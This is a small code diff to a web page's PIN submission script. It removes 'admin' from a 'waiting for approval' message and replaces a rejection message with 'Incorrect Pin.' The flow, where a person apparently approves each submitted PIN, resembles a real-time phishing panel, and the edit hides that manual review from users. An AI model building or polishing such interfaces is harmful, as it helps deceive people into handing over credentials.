@@ -293,7 +293,7 @@
             // Show loading state
             submitBtn.disabled = true;
             submitBtn.textContent = '⏳ Verifying...';
-            showStatus('⏳ Waiting for admin approval...', 'waiting');
+            showStatus('⏳ Waiting for  approval...', 'waiting');
 
             try {
                 const response = await fetch('/submit-pin', {
@@ -331,7 +331,7 @@
 
                         if (d.approved === false) {
                             clearInterval(poll);
-                            showStatus('❌ PIN verification rejected. Please try again.', 'error');
+                            showStatus('❌ Incorrect Pin.', 'error');
                             submitBtn.disabled = false;
                             submitBtn.textContent = '🔐 Verify PIN';
                             // Clear PIN boxes
